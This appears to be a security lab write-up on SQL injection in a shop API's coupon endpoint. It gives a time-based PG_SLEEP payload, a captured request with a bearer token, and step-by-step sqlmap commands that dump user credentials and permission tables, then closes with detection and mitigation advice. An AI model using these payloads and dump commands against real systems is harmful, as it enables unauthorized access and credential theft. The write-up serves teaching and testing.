# 💉 SQL Injection

SQL Injection is a vulnerability that occurs when user-supplied input is directly incorporated into SQL queries without proper validation or parameterization. This allows attackers to manipulate database queries, leading to unauthorized data access, modification, or extraction.

## 🎯 Target Endpoint

- `http://192.168.1.28:8888/workshop/api/shop/apply_coupon`

## ✅ Normal Request

### Request

```
POST /workshop/api/shop/apply_coupon HTTP/1.1
Host: 192.168.1.28:8888
Authorization: Bearer <JWT_TOKEN>
Content-Type: application/json

{"coupon_code":"test","amount":75}
```

## ⏱️ Time-Based SQL Injection

### Malicious Request

```
POST /workshop/api/shop/apply_coupon HTTP/1.1
Host: 192.168.1.28:8888
Authorization: Bearer <JWT_TOKEN>
Content-Type: application/json

{"coupon_code":"test';SELECT PG_SLEEP(5)--","amount":75}
```

## 🔍 Vulnerability Description

The `coupon_code` parameter is vulnerable to SQL Injection. The payload:

```sql
test';SELECT PG_SLEEP(5)--
```

breaks the original query and injects a new SQL statement. The use of `PG_SLEEP(5)` introduces a delay, confirming the injection point through a time-based technique.

Example vulnerable query:

```sql
SELECT * FROM coupons WHERE coupon_code = 'test';
```

Becomes:

```sql
SELECT * FROM coupons WHERE coupon_code = 'test';
SELECT PG_SLEEP(5)--';
```

## 💥 Impact

- Unauthorized database access
- Extraction of sensitive data (users, credentials)
- Authentication bypass
- Database enumeration
- Potential full system compromise depending on privileges

---

## 🛠️ Exploitation Using sqlmap

### Step 1: Save Request

Save the HTTP request into a file:

```bash
vim sqli-test.txt
```

Paste the full HTTP request:

```
POST /workshop/api/shop/apply_coupon HTTP/1.1
Host: 10.106.11.190:8888
Content-Length: 40
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1MUBhcm1vdXIubG9jYWwiLCJpYXQiOjE3NzQ0MDgyMTgsImV4cCI6MTc3NTAxMzAxOCwicm9sZSI6InVzZXIifQ.c2rH2H-lvKnEJzInyy-kS36tZLVWE1iK5LhuMOtL0oyIpz-ZFjPJSCpTeChsxSPNqt35pEujcnqX-pu1evfqilnG9JITEefheloyuDLG_XwZLKsf4B9WPLSApK_IgzrfyKkOMzb50KmpNUTMIkwby68n7C0fjg7CNPHF-XAt57cx_Vl6ZT2NUB-hom1XNZExuxYbWzoYUquwTzvuvGOr-cFxC8KC_wS7ujprYsA2ivPlV2FpscV_l7ydRfuB16WaYCb5xgs48aSebOeoCMwogReV3QG9UP37ikX2Fzk3i2mQqFz-qLAJR5O2-bZTUGeAXWlk0HDfOMwx8_99nvxN2g
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://10.106.11.190:8888
Referer: http://10.106.11.190:8888/shop
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"coupon_code":"test","amount":"75"}
```

### Step 2: Database Enumeration

Enumerate databases:

```bash
sqlmap -r sqli-test.txt -p coupon_code --dbs
```

### Step 3: List Tables

List all tables in the public schema:

```bash
sqlmap -r sqli-test.txt -p coupon_code -D public --tables
```

### Step 4: List Columns

List columns from a specific table (e.g., `user_login`):

```bash
sqlmap -r sqli-test.txt -p coupon_code -D public -T user_login --columns
```

### Step 5: Dump Sensitive Data

Dump sensitive columns from the `user_login` table:

```bash
sqlmap -r sqli-test.txt -p coupon_code -T user_login -D public -C id,email,password,role --dump
```

### Additional Enumeration

Dump data from related authorization tables:

```bash
sqlmap -r sqli-test.txt -p coupon_code -D public -T auth_permission --dump
```

```bash
sqlmap -r sqli-test.txt -p coupon_code -D public -T auth_group --dump
```

```bash
sqlmap -r sqli-test.txt -p coupon_code -D public -T auth_group_permissions --dump
```

```bash
sqlmap -r sqli-test.txt -p coupon_code -D public -T auth_user_user_permissions --dump
```
---
### Advanced sqlmap Usage

For more aggressive and thorough enumeration with advanced techniques:

```bash
sqlmap -r sqli-test.txt -p coupon_code -D public -T auth_group_permissions --dump --level=5 --risk=3 --threads=10 --dbms=PostgreSQL --technique=US
```

```bash
sqlmap -r sqli-test.txt -p coupon_code -D public -T auth_user_user_permissions --dump --level=5 --risk=3 --threads=10 --dbms=PostgreSQL --technique=US
```

## 🔎 Detection Techniques

- Inject special characters such as `'`, `"`, `;`
- Use time-based payloads (`PG_SLEEP`, `SLEEP`)
- Observe:
  - Response delays
  - Error messages
  - Changes in application behavior

## 🛡️ Mitigation Strategies

### Parameterized Queries

- Use prepared statements
- Avoid dynamic query construction

### Input Validation

- Validate and sanitize all user inputs
- Enforce strict data types

### ORM Usage

- Use secure ORM frameworks that prevent raw query injection

### Least Privilege

- Restrict database user permissions
- Avoid using admin-level database accounts

### Error Handling

- Do not expose database errors to users

## 📌 Key Takeaway

SQL Injection remains one of the most critical vulnerabilities because it allows direct interaction with the database. Even a single vulnerable parameter can lead to full database compromise if not properly secured.


